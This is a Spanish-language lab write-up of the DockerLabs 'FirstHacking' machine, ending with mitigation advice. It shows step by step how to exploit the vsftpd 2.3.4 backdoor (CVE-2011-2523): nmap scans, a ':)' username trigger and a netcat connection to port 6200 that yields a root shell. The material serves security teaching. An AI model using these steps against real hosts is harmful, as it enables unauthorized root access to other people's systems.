# FirstHacking

**Plataforma:** DockerLabs\
**Dificultad:** Muy fácil\
**Área:** FTP, enumeración y vulnerabilidades conocidas\
**Material seguido en clase:** [Writeup de referencia](https://github.com/ian16munoz3nunez1/DockerLabs/blob/main/firsthacking/firsthacking.md)

> La IP puede variar al desplegar el contenedor. El writeup utilizado trabaja con `172.17.0.2`.

## Objetivo

Identificar un servicio FTP vulnerable, relacionar su versión con una vulnerabilidad conocida y comprobar de forma controlada el impacto de la backdoor incluida en la versión comprometida de vsftpd 2.3.4.

## Procedimiento

### 1. Comprobar conectividad

Podemos comenzar verificando que el objetivo responde:

```bash
ping -c4 172.17.0.2
```

Este paso no demuestra que un servicio sea vulnerable; solamente confirma conectividad con el contenedor.

### 2. Escanear puertos y versiones

Realizamos un escaneo completo con detección de versiones:

```bash
nmap -sV -p- -T4 172.17.0.2
```

El resultado inicial relevante es:

```
21/tcp  open  ftp  vsftpd 2.3.4
```

Con esto ya tenemos tres piezas importantes: puerto, servicio y versión.

### 3. Buscar vulnerabilidades conocidas

El writeup utiliza los scripts de vulnerabilidades de Nmap sobre el puerto 21:

```bash
nmap --script vuln -p 21 172.17.0.2
```

La versión `vsftpd 2.3.4` utilizada por esta máquina está asociada a **CVE-2011-2523**.

### 4. Entender CVE-2011-2523

La versión comprometida de vsftpd contiene una backdoor. En el laboratorio, al enviar un nombre de usuario terminado en `:)`, el servicio activa una shell que escucha en el puerto **6200/TCP**.

La idea de la clase es entender la relación entre la versión identificada y el comportamiento anómalo que veremos después.

### 5. Conectarnos al servicio FTP

Abrimos una sesión FTP contra el objetivo:

```bash
ftp 172.17.0.2
```

Cuando solicita el usuario, utilizamos el patrón empleado por la backdoor del laboratorio:

```
user:)
```

No necesitamos completar una autenticación FTP normal; el objetivo del paso es activar el comportamiento vulnerable de esta versión.

### 6. Volver a comprobar los puertos

Después de activar la condición, repetimos el escaneo:

```bash
nmap -p- 172.17.0.2
```

Ahora debería aparecer un puerto que antes no estaba expuesto:

```
6200/tcp  open
```

Este cambio es una evidencia importante: una acción sobre FTP provocó la aparición de un nuevo servicio.

### 7. Conectarnos al puerto 6200

Utilizamos Netcat:

```bash
nc 172.17.0.2 6200
```

Si el laboratorio está funcionando como corresponde, obtenemos una shell.

### 8. Verificar el nivel de acceso

Ejecutamos:

```bash
whoami
id
hostname
```

El laboratorio devuelve una sesión con privilegios de `root`.

## Qué aprendimos

El procedimiento puede resumirse así:

```
Reconocimiento
      ↓
FTP 21/tcp
      ↓
vsftpd 2.3.4
      ↓
CVE-2011-2523
      ↓
Activación de la backdoor
      ↓
Aparece 6200/tcp
      ↓
Conexión con Netcat
      ↓
Shell root
```

La parte más valiosa no es memorizar `user:)`, sino aprender a pasar desde una versión de servicio a una investigación técnica, validar un comportamiento y observar evidencia antes y después de la explotación.

## Impacto

En el entorno vulnerable, la backdoor permite obtener ejecución remota con privilegios elevados. Por eso una versión comprometida de un servicio representa un riesgo crítico.

## Mitigación

* No utilizar versiones antiguas o comprometidas de vsftpd.
* Obtener paquetes desde fuentes verificadas.
* Mantener servicios actualizados.
* Deshabilitar FTP cuando no sea necesario.
* Aplicar segmentación y reglas de firewall.
* Monitorizar puertos y procesos inesperados.
* Mantener inventario de software y versiones desplegadas.

> Este procedimiento corresponde a una máquina deliberadamente vulnerable de DockerLabs y debe ejecutarse únicamente en laboratorios autorizados.
